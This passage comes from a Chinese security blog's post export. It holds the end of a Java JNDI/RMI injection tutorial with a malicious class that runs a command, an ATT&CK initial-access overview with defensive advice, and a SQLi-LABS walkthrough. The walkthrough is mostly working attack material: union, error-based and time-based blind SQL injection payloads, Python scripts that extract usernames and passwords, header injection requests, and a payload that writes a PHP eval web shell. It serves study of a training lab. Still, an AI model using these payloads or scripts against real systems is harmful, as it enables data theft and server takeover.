com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.Reference;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class RMIServer &#123; public static void main(String[] args) throws Exception&#123; Registry registry= LocateRegistry.createRegistry(7777); Reference reference = new Reference(\"test\", \"test\", \"http://localhost/\"); ReferenceWrapper wrapper = new ReferenceWrapper(reference); registry.bind(\"calc\", wrapper); &#125;&#125; 恶意代码（test.class），将其编译好放到可访问的http服务器 1234567import java.lang.Runtime;public class test&#123; public test() throws Exception&#123; Runtime.getRuntime().exec(\"calc\"); &#125;&#125; 当客户端通过InitialContext().lookup(“rmi://127.0.0.1:7777/calc”)获取远程对象时，会执行我们的恶意代码 12345678910package demo;import javax.naming.InitialContext;public class JNDI_Test &#123; public static void main(String[] args) throws Exception&#123; //jdk1.8.121之后需要添加System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", \"true\") new InitialContext().lookup(\"rmi://127.0.0.1:7777/calc\"); &#125;&#125; JDK &lt; 8u191我们在上面讲了在JDK 6u132, JDK 7u122, JDK 8u113中Java限制了通过RMI远程加载Reference工厂类，com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为了false，即默认不允许通过RMI从远程的Codebase加载Reference工厂类。 但是需要注意的是JNDI不仅可以从通过RMI加载远程的Reference工厂类，也可以通过LDAP协议加载远程的Reference工厂类，但是在之后的版本Java也对LDAP Reference远程加载Factory类进行了限制，在JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase属性的值默认为false，对应的CVE编号为：CVE-2018-3149 JDK &gt;8u191在jdk8u191之后RMI和LDAP默认都不能从远程加载类,还是可以在RMI和LDAP中获取对象。在前面我们分析过javax.naming.spi.NamingManager#getObjectFactoryFromReference方法,会先从本地的CLASSPATH中寻找该类,如果没有才会去远程加载。之后会执行静态代码块、代码块、无参构造函数和getObjectInstance方法。那么只需要在攻击者本地CLASSPATH找到这个Reference Factory类并且在这四个地方其中一块能执行payload就可以了 JNI字段描述符JNI 字段描述符【Java Native Interface FieldDescriptors】，它是一种对 Java 数据类型、数组、方法的编码 基本概念这种编码方式把 Java 中的基本数据类型、数组、对象都使用一种规范来表示： 八种基本数据类型都使用一个大写字母表示 void 使用 V 表示 数组使用左方括号表示 方法使用一组圆括号表示，参数在括号里，返回类型在括号右侧 对象使用 L 开头，分号结束，中间是类的完整路径，包名使用正斜杠分隔 基本编码基本编码如下表格，并配有解释说明： 举例说明数据类型1、[I：表示 int 一维数组，即int []。2、Ljava/lang/String;：表示 String 类型，即 java.lang.String。3、[Ljava/lang/Object;：表示 Object 一维数组，即 java.lang.Object []。4、Z：表示 boolean 类型。5、V：表示 void 类型。 方法1、() V：表示参数列表为空，返回类型为 void 的方法，即 void func ()。2、(II) V：表示参数列表为 int、int，返回类型为 void 的方法，即 void func (int i,int j)。3、(Ljava/lang/String;Ljava/lang/String;) I：表示参数列表为 String、String，返回类型为 int 的方法， 即 int func (String i,String j)。4、([B) V：表示参数列表为byte []，返回类型为 void 的方法，即 void func (byte [] bytes)。5、(ILjava/lang/Class;) J：表示参数列表为 int、Class，返回类型为 long 的方法，即 long func (int i,Class c)。 SOAPSOAP 是基于 XML 的简易协议，可使应用程序在 HTTP 之上进行信息交换。 或者更简单地说：SOAP 是用于访问网络服务的协议。SOAP菜鸟教程 参考文章:Java反序列化漏洞原理解析Java反序列化漏洞分析攻击Java Web应用-Java Web安全JAVA RMI 反序列化知识详解java.rmi.Naming和java.rmi.registry.LocateRegistry的区别JAVA反序列化 - Commons-Collections组件Java反序列化入门-Shiro RememberMe 1.2.4远程代码执行漏洞-详细分析老大难的 Java ClassLoader 再不理解就老了: https://zhuanlan.zhihu.com/p/51374915 JAVA JNDI注入知识详解:http://blog.topsec.com.cn/java-jndi%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E8%AF%A6%E8%A7%A3/","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/tags/web%E5%AE%89%E5%85%A8/"},{"name":"java反序列化","slug":"java反序列化","permalink":"https://blog.cfyqy.com/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"author":"ye1s"},{"title":"ATT&CK _Initial_Access","slug":"TT-CK-Initial-Access","date":"2020-05-31T05:51:00.000Z","updated":"2020-06-10T08:26:39.529Z","comments":true,"path":"article/a1ebb960.html","link":"","permalink":"https://blog.cfyqy.com/article/a1ebb960.html","excerpt":"初始化访问，是攻击者对目标入侵的立足点。攻击利用点主要包括系统、服务、第三方应用的漏洞，目标服务薄弱的安全防护措施，以及目标服务相关的内部人员、技术支持、信任伙伴等有关接触和联系者。","text":"初始化访问，是攻击者对目标入侵的立足点。攻击利用点主要包括系统、服务、第三方应用的漏洞，目标服务薄弱的安全防护措施，以及目标服务相关的内部人员、技术支持、信任伙伴等有关接触和联系者。 0x1 Drive-by Compromise概念路过式攻击：指的是攻击者利用用户正常访问和浏览网站来获取系统访问权限。攻击者通常利用此技术针对用户的web浏览器来实施漏洞攻击。他们也可能会侵入网站进行非攻击行为，例如获取应用程序访问令牌。路过式攻击在这里应该是包括水坑攻击和路过式下载。 水坑攻击（Water Holing）：是指黑客通过分析攻击目标的网络活动规律，寻找攻击目标经常访问的网站的弱点，先攻下该网站并植入攻击代码，等待攻击目标访问该网站时实施攻击。 路过式下载（Drive-by download）: 用户不知道的情况下下载间谍软件、计算机病毒或者任何恶意软件。路过式下载可能发生在用户访问一个网站、阅读一封电子邮件、或者点击一个欺骗性弹出式窗口的时候。 防护建议1.应用隔离和沙箱2.漏洞利用防护3.Web内容限制4.软件更新 检测建议1.URL黑名单、携带可疑参数2.恶意脚本检测3.异常的进程、文件写入等行为检测 0x2 Exploit Public-Facing Application概念面向公众应用的利用：通过利用系统、Web应用、中间件、数据库、相关服务存在的漏洞进行入侵。 防护建议 1.应用隔离和沙箱2.漏洞利用防护3.网络分区4.特权账号管理5.软件更新6.漏洞扫描 检测建议1.日志监控2.网络数据包检查3.Web应用防火墙检测 0x3 External Remote Services概念外部远程服务 ：VPN、Citrix等远程服务以及其它访问机制允许用户从外部访问企业内部网络资源。通常有远程服务网关来管理这些服务连接和凭据认证。Windows远程管理等服务也可以在外部使用。 攻击者可能会通过凭据欺骗或入侵企业网络从用户侧获取凭据的方式来获得有效账号权限。进而访问公司内网。 防护建议1.特性/程序禁用或删除2.网络资源访问限制3.多因子认证4.网络分区 检测建议1.根据最佳实践检测攻击者使用有效账号来应对远程服务身份认证的行为。2.收集认证日志并分析异常访问模式，活动窗口以及正常工作时间之外的访问。 0x4 Hardware Additions概念硬件添加： 攻击者通过计算机配件、计算机或网络硬件作为载体接入系统从而获得执行权限防护建议1.限制网络资源访问2.限制硬件安装检测建议1.可借助资产管理系统来发现本不应该接入的计算机系统或者网络设备。2.可使用终端探针来检测通过USB接口、雷电接口以及其他外设接口添加的硬件。 0x5 Replication Through Removable Media概念通过移动存储进行复制： 攻击者可能会通过拷贝恶意软件到移动存储介质然后插入系统并利用Autorun功能来执行恶意软件，从而进入到系统。防护建议1.禁用或删除相关功能或程序2.限制硬件安装检测建议1.监控移动存储介质上的文件访问2.检测移动存储介质插入后或由用户启动时从此介质上执行的进程 0x6 Spearphishing Attachment概念鱼叉式钓鱼附件是网络钓鱼的一种特殊变体。它与其他形式的鱼叉式钓鱼攻击不同之处在于它以附件形式将恶意文件附加到电子邮件中。 附件可能有多种文件类型如Microsoft Office系列文件，可执行文件，PDF文件或者归档文件。用户打开附件（甚至点击通过了安全确认）后，攻击负载会利用系统漏洞执行或者直接在系统上执行。防护建议1.杀毒程序2.网络入侵防御3.附件类型限制4.用户培训检测建议1.可使用网络入侵防御系统（IPS）和邮件网关可以用来检测传输中的带恶意附件的钓鱼邮件2.杀毒软件可以检测到电子邮件服务器或用户计算机上存储的恶意文件和附件 0x7 Spearphishing Link概念 鱼叉式钓鱼链接是网络钓鱼的一种特殊变体。它与其他形式的鱼叉式钓鱼攻击不同之处在于它在电子邮件中提供链接来下载恶意软件，而不是以附件形式将恶意文件附加到电子邮件中。这样可以逃避邮件附件检查。防护建议1.Web内容限制2.用户培训检测建议1.URL黑名单检测2.沙箱 0x8 Spearphishing via Service概念通过服务进行鱼叉式钓鱼攻击是使用第三方服务来实现网络钓鱼攻击。防护建议1.杀毒程序2.Web内容限制3.用户培训检测建议1.杀毒软件检测下载的恶意文件2.端点检测或网络检测可检测“客户端执行利用”及“脚本编程”攻击技术相关恶意事件 0x9Supply Chain Compromise概念供应链攻击是指攻击者在用户得到交付物之前，通过篡改产品或者产品交付机制从而攻击数据或者系统。供应链攻击可以在供应链的任何阶段发生，比如： · 篡改开发工具· 篡改开发环境· 篡改源代码仓库（公开或私有的）· 篡改依赖的开源代码· 篡改软件的更新/分发机制· 感染系统镜像（已经有多起可移动介质在工厂中即被感染的案例）· 用修改过的版本替换合法软件· 向合法的软件分销商销售篡改/假冒的产品· 装运过程中拦截 防护建议1.软件更新2.漏洞扫描检测建议1.哈希校验2.动态行为检测 0x10 Trusted Relationship概念攻击者可能会破坏或利用能够接触到目标受害者的组织。通过受信任的第三方关系进行访问目标。防护建议1.网络分区2.用户账户控制检测建议监控第二方和第三方提供商以及其他可作为网络访问手段的受信任实体的活动 0x11 Valid Accounts概念攻击者可能会使用凭据访问技术窃取特定用户或服务账号的凭据，或者在侦察过程的早期通过社会工程捕获凭据以获得首次访问权限。 攻击者可以使用三种账号：默认账号、本地账号和域账号。防护建议1.应用程序开发人员指南2.审核3.网络流量过滤4.多因子认证5.密码策略6.特权账号管理7.用户账户管理检测建议1.在整个企业中为外部可访问的服务配置可靠、一致的账号活动审核策略。查看是否有跨系统的可疑的共享账号（用户、管理员或服务账号）行为。2.定期审核域账号和本地系统账号来查看是否有攻击者为持久性所创建的账号。","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://blog.cfyqy.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"ATT&CK","slug":"ATT-CK","permalink":"https://blog.cfyqy.com/tags/ATT-CK/"},{"name":"Initial_Access","slug":"Initial-Access","permalink":"https://blog.cfyqy.com/tags/Initial-Access/"}],"author":"ye1s"},{"title":"SQLi-LABS Page-1(Basic Challenges)","slug":"SQLi-LABS-Page-1-Basic-Challenges-1","date":"2020-05-27T04:44:00.000Z","updated":"2020-06-09T00:32:11.883Z","comments":true,"path":"article/c6378bdc.html","link":"","permalink":"https://blog.cfyqy.com/article/c6378bdc.html","excerpt":"自己在sqli注入方面还是有点薄弱，准备花点时间补补。","text":"自己在sqli注入方面还是有点薄弱，准备花点时间补补。 Less-1单引号注入 1234567891011121314151617181920212223&lt;?php$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo \"&lt;font size='5' color= '#99FF00'&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/font&gt;\"; &#125;&#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125;?&gt; tips基本信息 123456789user()：当前数据库用户database()：当前数据库名 version()：当前使用的数据库版本 @@datadir：数据库存储数据路径 length(str) ：返回字符串str的长度 information_schema //系统数据库，记录当前数据库的数据库，表，列，用户权限等信息SCHEMATA//储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等TABLES//储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等COLUMNS//储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等 字符串连接函数 123concat(str1,str2) //将字符串首尾相连concat_ws(separator,str1,str2) //将字符串用指定连接符连接group_concat()//用于把多条数据一次注入出来 answer：判断表的字段数。从1到4，当数字为4时，报错，可知字段为3 1http://192.168.3.7/sqli/Less-1/?id=1' order by 4 --+ 判断显示位。可以得到显示位为2,3 1http://192.168.3.7/sqli/Less-1/?id=-1' union select 1,2,3 --+ 得到数据库名security 1http://192.168.3.7/sqli/Less-1/?id=-1' union select 1,database(),3 --+ 得到表名emails,referers,uagents,users 1http://192.168.3.7/sqli/Less-1/?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 --+ 得到列名id,username,password 1http://192.168.3.7/sqli/Less-1/?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 --+ 得到数据 1http://192.168.3.7/sqli/Less-1/?id=-1' union select 1,(select group_concat(username,0x23,password) from users),3 --+ Less-2整形注入 12345&lt;?php$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result);?&gt; answer: 1http://192.168.3.7/sqli/Less-2/?id=1 --+ Less-3单引号和括号注入 12345&lt;?php$sql=\"SELECT * FROM users WHERE id=('$id') LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result);?&gt; answer: 1http://192.168.3.7/sqli/Less-3/?id=1') --+ Less-4双引号注入和括号注入 123456&lt;?php$id = '\"' . $id . '\"';$sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result);?&gt; answer: 1http://192.168.3.7/sqli/Less-4/?id=1\") --+ Less-5布尔盲注 12345678910111213141516171819202122232425&lt;?php$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font size=\"3\" color=\"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; &#125;&#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125;?&gt; tips:常见的截取函数 12345left(str,len) //从左边开始截取len个字符 right(str,len) //从右边第index开始截取字符 substring(str,pos) //从左边index开始截取 注意这里的pos位置是从1开始的，不是数组的0开始 substr(str, pos, len) //将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始 mid(str,pos,len) //截取str 从index开始,截取len的长度 注意这里的pos位置是从1开始的，不是数组的0开始 比较函数： 12strcmp(expr1,expr2) //如果两个字符串是一样则返回0,如果第一个小于第二个则返回-1 find_in_set(str,strlist) //如果相同则返回1不同则返回0 answer: 12345678910111213141516171819202122232425262728import requestsdef binary(): url=\"http://192.168.3.7/sqli/Less-5/?id=1\" #payload=\"1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;&#125;,1),&#123;&#125;,1))&lt;&#123;&#125; --+\" #payload = \"1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit &#123;&#125;,1),&#123;&#125;,1))&lt;&#123;&#125; --+\" payload=\"1' and ascii(substr((select password from users limit &#123;&#125;,1),&#123;&#125;,1))&lt;&#123;&#125; --+\" for i in range(8): info=\"\" for j in range(1,40): left=0x20 right=0x7f while 1: mid=left+(right-left)//2 if mid==left: #print(mid) info=info+chr(mid) print(info) break tmppayload=payload.format(i,j,mid) tmpurl=url+tmppayload res=requests.get(tmpurl) if 'You are in' in res.text: right=mid else: left=midbinary() Less-6双引号报错注入 1234567891011121314151617181920212223242526&lt;?php $id = '\"'.$id.'\"';$sql=\"SELECT * FROM users WHERE id=$id LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font size=\"3\" color= \"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; &#125;&#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125;?&gt; answer: 得到数据库名 1http://192.168.3.7/sqli/Less-6/?id=1\" union select count(*),2,concat(':',(select database()),':',floor(rand()*2))as a from information_schema.tables group by a --+ 得到表名 1http://192.168.3.7/sqli/Less-6/?id=1\" union select count(*),2,concat(':',(select group_concat(table_name) from information_schema.tables where table_schema=database()),':',floor(rand()*2))as a from information_schema.tables group by a --+ 得到列名 1http://192.168.3.7/sqli/Less-6/?id=1\" union select count(*),2,concat(':',(select group_concat(column_name) from information_schema.columns where table_name='users'),':',floor(rand()*2))as a from information_schema.tables group by a --+ 得到数据 1http://192.168.3.7/sqli/Less-6/?id=1\" union select count(*),2,concat(':',(select concat(username,0x23,password) from users limit 0,1),':',floor(rand()*2))as a from information_schema.tables group by a --+ Less-71234567891011121314151617181920212223&lt;?php $sql=\"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; echo 'You are in.... Use outfile......'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#FFFF00\"&gt;'; echo 'You have an error in your SQL syntax'; //print_r(mysql_error()); echo \"&lt;/font&gt;\"; &#125;&#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125;?&gt; tips数据库用户权限判断 12and (select count(*) from mysql.user)&gt;0 --+ 如果返回正常,说明具有读写权限。and (select count(*) from mysql.user)&gt;0 --+ 返回错误，数据库帐户较低。 secure_file_priv这个参数用来限制数据导入和导出操作的效果，例如执行LOAD DATA、SELECT … INTO OUTFILE语句和LOAD_FILE()函数。这些操作需要用户这些操作需要用户具有FILE权限。 secure_file_priv的三种取值: 123如果这个参数为空，这个变量没有效果； 如果这个参数设为一个目录名，MySQL服务只允许在这个目录中执行文件的导入和导出操作。这个目录必须存在，MySQL服务不会创建它； 如果这个参数为NULL，MySQL服务会禁止导入和导出操作 获取路径函数： 12@@datadir 读取数据库路径@@basedir MYSQL 获取安装路径 文件函数： 12?id=1' union select 1,2,load_file('/etc/init.d/httpd') //读取文件select xxoo into outfile '路径' //权限较高时可直接写文件 answer:可以使用盲注，当题目的本意应该是让我们使用outfile函数，这里web站点的安装路径无法通过报错提出，只能靠猜解。 1http://192.168.3.7/sqli/Less-7/?id=1')) union select 1,2,'&lt;?php @eval($_POST[ye1s]); ?&gt;' into outfile 'D:\\\\phpstudy_pro\\\\WWW\\\\sqli\\\\shell.php' --+ Less-8布尔盲注 123456789101112131415161718192021222324252627&lt;?php$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; //echo 'You are in...........'; //print_r(mysql_error()); //echo \"You have an error in your SQL syntax\"; echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; &#125;&#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125;?&gt; answer 1234567891011121314151617181920212223import requestsdef and_operation(): url=\"http://192.168.3.7/sqli/Less-8/?id=1\" # &amp;运算要注意编码,特别是get请求的时候，会跟参数的分隔符&amp;混淆 #payload = \"' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;&#125;,1),&#123;&#125;,1))%26&#123;&#125; --+\" #payload = \"' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit &#123;&#125;,1),&#123;&#125;,1))%26&#123;&#125; --+\" payload=\"' and ascii(substr((select concat(username,0x23,password )from users limit &#123;&#125;,1),&#123;&#125;,1))%26&#123;&#125; -- +\" for i in range(8): info=\"\" for j in range(1,40): value=0 for k in range(7): tmppayload=payload.format(i,j,2**k) tmpurl=url+tmppayload res=requests.get(tmpurl) if 'You are in' in res.text: value=value+(2**k) if value==0: break info=info+chr(value) print(info)and_operation() Less-9时间盲注 123456789101112131415161718192021222324252627&lt;?php $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; //print_r(mysql_error()); //echo \"You have an error in your SQL syntax\"; echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; &#125;&#125; else &#123; echo \"Please input the ID as parameter with numeric value\";&#125;?&gt; 不管sql语句的执行结果如何都会返回同样的信息，这个时候只能使用时间盲注。tips:延迟函数 12sleep(duration) &#x2F;&#x2F;暂停duration秒benchmark(count,expr) &#x2F;&#x2F;重复执行count次expr 条件语句 1234if(expr1,expr2,expr3) // expr1 true执行expr2否则执行expr3select case when 条件 then 代码1 else 代码 2 endIFNULL(expression, alt_value) 如果第一个参数的表达式 expression 为 NULL，则返回第二个参数的备用值。 NULLIF(expr1, expr2) 比较两个字符串，如果字符串 expr1 与 expr2 相等 返回 NULL，否则返回 expr1 answer: 12345678910111213141516171819202122232425262728293031323334353637import requestsimport timedef binary(): url=\"http://192.168.3.7/sqli/Less-9/?id=1\" #payload=\"' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit &#123;&#125;,1),&#123;&#125;,1))&lt;&#123;&#125; --+\" #payload = \"' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit &#123;&#125;,1),&#123;&#125;,1))&lt;&#123;&#125; --+\" payload=\"' and if(ascii(substr((select password from users limit &#123;&#125;,1),&#123;&#125;,1))&lt;&#123;&#125;,sleep(2),1) --+\" for i in range(8): info=\"\" flag=0#判断是否数字的末尾 for j in range(1,40): if flag==1: break left=0x20 right=0x7f while 1: mid=left+(right-left)//2 if mid==left: #print(mid) if mid==0x20: flag=1 break info=info+chr(mid) print(info) break tmppayload=payload.format(i,j,mid) tmpurl=url+tmppayload startTime=time.time() res=requests.get(tmpurl) endTime=time.time() spendTime=endTime-startTime if spendTime&gt;=2: right=mid else: left=midbinary() Less-10双引号时间盲注 Less-11登录框的报错注入 或万能密码 123456789101112131415161718192021222324252627282930313233343536&lt;?php @$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) &#123; echo \"&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 4&gt;'; echo '&lt;font size=\"3\" color=\"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; echo 'Your Password:' .$row['password']; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; echo \"&lt;br&gt;\"; echo \"&lt;br&gt;\"; echo '&lt;img src=\"../images/flag.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#0000ff\" font size=\"3\"&gt;'; //echo \"Try again looser\"; print_r(mysql_error()); echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo '&lt;img src=\"../images/slap.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; &#125;&#125;?&gt; answer:报错注入 123POST /sqli/Less-11/uname=admin' and (updatexml(1,concat(0x7e,(select database()),0x7e),1)) --+&amp;passwd=sdf&amp;submit=Submit 万能密码 123POST /sqli/Less-11/uname=admin' --+&amp;passwd=sdf&amp;submit=Submit Less-12报错注入或 万能密码“)注入 Less-13‘)报错注入 Less-14“报错注入 123POST /sqli/Less-14/ uname=sdf\" and (extractvalue(1,concat(0x7e,(select database()),0x7e))) --+&amp;passwd=sdf&amp;submit=Submit Less-15单引号时间盲注answer: 123456789101112131415161718192021222324252627282930313233343536import requestsimport timedef binary(): url=\"http://192.168.3.7/sqli/Less-15/\" payload=\"admin' and case when (ascii(substr((select concat(table_name) from information_schema.tables where table_schema=database() limit &#123;&#125; ,1),&#123;&#125;,1))&lt;&#123;&#125;) then sleep(3) else 1 end -- +\" for i in range(10): info = \"\" for j in range(0,40): flag=0 left=0x1f right=0x7f while 1: mid=left+(right-left)//2 if mid==left: if mid==0x1f: flag=1 break info=info+chr(mid) print(info) break data=&#123; 'uname': payload.format(i,j,mid), 'passwd': \"ye1s\", 'submit': 'Submit' &#125; # print(payload.format(i,j,mid)) startTime=time.time() requests.post(url=url,data=data) endTime=time.time() spendTime=endTime-startTime if spendTime&gt;=3: right=mid else: left=midbinary() Less-16“) 时间盲注 Less-17报错注入 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960function check_input($value) &#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,15); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a number if (!ctype_digit($value)) &#123; $value = \"'\" . mysql_real_escape_string($value) . \"'\"; &#125; else &#123; $value = intval($value); &#125; return $value; &#125; $uname=check_input($_POST['uname']); $passwd=$_POST['passwd']; @$sql=\"SELECT username, password FROM users WHERE username= $uname LIMIT 0,1\";$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; $row1 = $row['username']; $update=\"UPDATE users SET password = '$passwd' WHERE username='$row1'\"; mysql_query($update); echo \"&lt;br&gt;\"; if (mysql_error()) &#123; echo '&lt;font color= \"#FFFF00\" font size = 3 &gt;'; print_r(mysql_error()); echo \"&lt;/br&gt;&lt;/br&gt;\"; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font color= \"#FFFF00\" font size = 3 &gt;'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; &#125; echo '&lt;img src=\"../images/flag1.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; &#125; else &#123; echo '&lt;font size=\"4.5\" color=\"#FFFF00\"&gt;'; echo \"&lt;/br&gt;\"; echo '&lt;img src=\"../images/slap1.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; &#125; get_magic_quotes_gpc 获取当前 magic_quotes_gpc的配置选项设置。magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，:。在magic_quotes_gpc=On的情况下，如果post、get、cookie请求的数据有单引号（’）、双引号（”）、反斜线（\\）与 NUL（NULL 字符）等字符都会被加上反斜线（\\）。 php5.4后被移除。这里对uname的长度进行截取，只为15字符。对uname注入无法入手，只能从passwd入手，为了能执行第二条密码更新的sql语句，uname的取值，必须了已存在的用户。 answer: 123POST /sqli/Less-17/uname=admin&amp;passwd=admin' and (extractvalue(1,concat(0x7e,(select database()),0x7e))) --+ &amp;submit=Submit Less-18User-Agent的头部注入 1234567891011121314151617181920212223242526272829303132333435$uname = check_input($_POST['uname']);$passwd = check_input($_POST['passwd']);$sql=\"SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\";$result1 = mysql_query($sql);$row1 = mysql_fetch_array($result1); if($row1) &#123; echo '&lt;font color= \"#FFFF00\" font size = 3 &gt;'; $insert=\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\"; mysql_query($insert); //echo 'Your IP ADDRESS is: ' .$IP; echo \"&lt;/font&gt;\"; //echo \"&lt;br&gt;\"; echo '&lt;font color= \"#0000ff\" font size = 3 &gt;'; echo 'Your User Agent is: ' .$uagent; echo \"&lt;/font&gt;\"; echo \"&lt;br&gt;\"; print_r(mysql_error()); echo \"&lt;br&gt;&lt;br&gt;\"; echo '&lt;img src=\"../images/flag.jpg\" /&gt;'; echo \"&lt;br&gt;\"; &#125; else &#123; echo '&lt;font color= \"#0000ff\" font size=\"3\"&gt;'; //echo \"Try again looser\"; print_r(mysql_error()); echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo '&lt;img src=\"../images/slap.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; &#125;&#125; 这里并不是URL而是HTTP头，所以+并不会被转义为(空格)，于是末尾的注释符号要变为#。answer: 1234567891011121314POST /sqli/Less-18/ HTTP/1.1Host: 192.168.3.7User-Agent: Mozilla' or updatexml(1,concat('#',(database())),0),'','') #Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 38Origin: http://192.168.3.7Connection: closeReferer: http://192.168.3.7/sqli/Less-18/Upgrade-Insecure-Requests: 1uname=admin&amp;passwd=admin&amp;submit=Submit Less-191$insert=\"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')\"; tips: 使用逻辑运算符（and or xor &amp;&amp; ||） 12mysql&gt; insert into users values (3,'name' xor updatexml(2,concat(0x7e,(version())),0) xor '','pass');ERROR 1105 (HY000): XPATH syntax error: '~5.5.40-log' 使用算数运算符（+ – * /） 12mysql&gt; insert into users values (3,'name'+updatexml(2,concat(0x7e,(version())),0) xor '','pass');ERROR 1105 (HY000): XPATH 